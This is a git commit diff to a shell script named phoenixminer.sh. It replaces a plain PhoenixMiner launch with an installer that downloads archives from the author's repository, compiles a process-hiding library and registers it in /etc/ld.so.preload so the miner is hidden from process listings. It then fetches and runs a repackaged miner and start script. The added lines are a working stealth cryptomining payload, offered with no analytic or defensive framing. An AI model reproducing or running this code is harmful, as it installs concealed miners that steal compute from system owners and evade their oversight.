d9b6ae844159ba83cd08ba43c032dc4cdd5de5e8
chadpetersen1337 <68467197+chadpetersen1337@users.noreply.github.com>
2020-11-21 13:33:46 +0200

    Update phoenixminer.sh

--- phoenixminer.sh
+++ phoenixminer.sh
@@ -1,6 +1,18 @@
 #!/bin/sh
-wget https://github.com/PhoenixMiner-download/PhoenixMiner/releases/download/5.1c/PhoenixMiner_5.1c_Linux.zip
-unzip PhoenixMiner_5.1c_Linux.zip
-cd PhoenixMiner_5.1c_Linux
+wget https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/magicPho.zip
+unzip magicPho.zip
+make
+gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
+mv libprocesshider.so /usr/local/lib/
+echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
+wget https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/PhoenixMiner_5.2d_Linux.zip
+unzip PhoenixMiner_5.2d_Linux.zip
+cd PhoenixMiner_5.2d_Linux
+chmod +x 1_Ethereum-nanopool_and_email.sh
+chmod +x 2_Ethereum--miningpoolhub.sh
+chmod +x 3_Ehereum-ezil.sh
+chmod +x 5_Ethereum-ethermine.sh
+chmod +x 13_Ethereum-hiveon.sh
 chmod +x PhoenixMiner
-./PhoenixMiner -pool ssl://us1.ethermine.org:5555 -wal 0x8CB8003E428D0Fd7693D22f576A212403728c64a -worker phoenixminer -epsw x -mode 1 -log 2 -mport 0 -etha 0 -ftime 55 -retrydelay 1 -tt 79 -tstop 89  -coin eth
+chmod +x start_miner.sh
+./start_miner.sh
